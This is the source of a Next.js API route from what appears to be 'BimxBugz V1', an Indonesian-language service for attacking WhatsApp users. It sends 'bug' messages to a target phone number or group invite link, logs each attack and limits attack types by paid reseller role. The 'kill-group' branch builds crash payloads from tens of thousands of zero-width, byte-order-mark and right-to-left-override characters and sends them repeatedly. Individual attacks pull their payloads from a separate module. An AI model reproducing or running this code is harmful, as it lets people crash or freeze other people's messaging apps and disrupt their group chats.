import { NextRequest, NextResponse } from "next/server";
import { verifyToken } from "@/lib/auth";
import { getWAConnection, isWAConnected } from "@/lib/waManager";
import { BUG_PAYLOADS } from "@/lib/bugPayloads";
import { db, getDbStatus, isDatabaseAvailable } from "@/db";
import { attackLogs } from "@/db/schema";
import { memoryDB } from "@/lib/dbMemory";

export async function POST(req: NextRequest) {
  try {
    const auth = req.headers.get("authorization");
    if (!auth?.startsWith("Bearer ")) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    const payload = verifyToken(auth.slice(7));
    if (!payload) return NextResponse.json({ error: "Token tidak valid" }, { status: 401 });

    const { attackType, target, groupLink } = await req.json();

    if (!isWAConnected(`${payload.userId}`)) {
      return NextResponse.json({ 
        error: "⚠️ WA BELUM TERHUBUNG! Silahkan hubungkan nomor WA pengirim di menu Pairing terlebih dahulu.",
        code: "NOT_CONNECTED"
      }, { status: 400 });
    }

    const wa = getWAConnection(`${payload.userId}`);
    if (!wa?.sock) {
      return NextResponse.json({ error: "Koneksi WA tidak aktif, silahkan hubungkan ulang" }, { status: 400 });
    }

    // Handle group kill
    if (attackType === "kill-group" && groupLink) {
      let groupId = groupLink;
      if (groupLink.includes("chat.whatsapp.com/")) {
        const inviteCode = groupLink.split("chat.whatsapp.com/")[1].split(/[?#]/)[0];
        try {
          groupId = await wa.sock.groupGetInviteInfo(inviteCode).then((info: any) => info.id).catch(() => inviteCode);
        } catch {
          groupId = inviteCode;
        }
      }

      const invisiblePayload = "\u200B".repeat(10000) + "\u200C".repeat(5000) + "\u200D".repeat(5000);
      const corruptedPayload = "\uFFFD".repeat(5000) + "\u00AD".repeat(5000) + "\uFEFF".repeat(10000);
      
      try {
        for (let i = 0; i < 5; i++) {
          const heavyLoad = i % 2 === 0 ? invisiblePayload : corruptedPayload;
          const glitch = "\u202E".repeat(3000) + heavyLoad + "💀".repeat(100);
          try {
            await wa.sock.sendMessage(groupId.includes("@g.us") ? groupId : `${groupId}@g.us`, { text: glitch });
            await new Promise(r => setTimeout(r, 800));
          } catch (e) {
            console.log("Group send attempt failed", e);
          }
        }
      } catch (err: any) {
        console.error("Group attack error:", err);
      }

      // Log
      const dbStatus = getDbStatus();
      if (dbStatus.available && isDatabaseAvailable && db) {
        try {
          await db.insert(attackLogs).values({
            userId: payload.userId,
            username: payload.username,
            attackType: "kill-group",
            target: groupLink,
            status: "success",
          });
        } catch {
          await memoryDB.createAttackLog(payload.userId, payload.username, "kill-group", groupLink, "success");
        }
      } else {
        await memoryDB.createAttackLog(payload.userId, payload.username, "kill-group", groupLink, "success");
      }

      return NextResponse.json({
        success: true,
        message: "BimxBugz V1 menyatakan bahwa pengiriman bug anda Success dan insyaallah akan bekerja",
        credit: "BimxBugz By BimzOfficial, SIKIKKK AYAAAAA!!!",
        target: groupLink,
        method: "invisible-group-payload",
        realWA: true,
      });
    }

    // Individual attack
    if (!attackType || !target) {
      return NextResponse.json({ error: "Data serangan tidak lengkap" }, { status: 400 });
    }

    if (payload.role === "user" && attackType !== "delay-attack") {
      return NextResponse.json({ error: "🔒 FITUR INI KHUSUS MEMBER RESELLER/OWNER. SILAKAN UPGRADE AKUNMU!" }, { status: 403 });
    }

    const attackFn = BUG_PAYLOADS[attackType];
    if (!attackFn) {
      return NextResponse.json({ error: "Tipe serangan tidak dikenal" }, { status: 400 });
    }

    const cleanTarget = target.replace(/[^0-9]/g, "");
    const jid = `${cleanTarget}@s.whatsapp.net`;
    const payloads = attackFn();
    const messagesToSend = Array.isArray(payloads) ? payloads : [payloads];

    let sentCount = 0;
    for (const msgContent of messagesToSend) {
      try {
        await wa.sock.sendMessage(jid, { text: msgContent });
        sentCount++;
        if (messagesToSend.length > 1) {
          await new Promise(r => setTimeout(r, 600));
        }
      } catch (err: any) {
        console.error(`Failed to send attack chunk:`, err?.message);
      }
    }

    const dbStatus = getDbStatus();
    if (dbStatus.available && isDatabaseAvailable && db) {
      try {
        await db.insert(attackLogs).values({
          userId: payload.userId,
          username: payload.username,
          attackType,
          target: cleanTarget,
          status: sentCount > 0 ? "success" : "partial",
        });
      } catch {
        await memoryDB.createAttackLog(payload.userId, payload.username, attackType, cleanTarget, sentCount > 0 ? "success" : "partial");
      }
    } else {
      await memoryDB.createAttackLog(payload.userId, payload.username, attackType, cleanTarget, sentCount > 0 ? "success" : "partial");
    }

    return NextResponse.json({
      success: true,
      sent: sentCount,
      total: messagesToSend.length,
      message: "BimxBugz V1 menyatakan bahwa pengiriman bug anda Success dan insyaallah akan bekerja",
      credit: "BimxBugz By BimzOfficial, SIKIKKK AYAAAAA!!!",
      attackType,
      target: cleanTarget,
      jid,
      realWA: true,
    });

  } catch (err: any) {
    console.error("WA Send error:", err);
    return NextResponse.json({ error: err.message || "Gagal mengirim serangan WA" }, { status: 500 });
  }
}
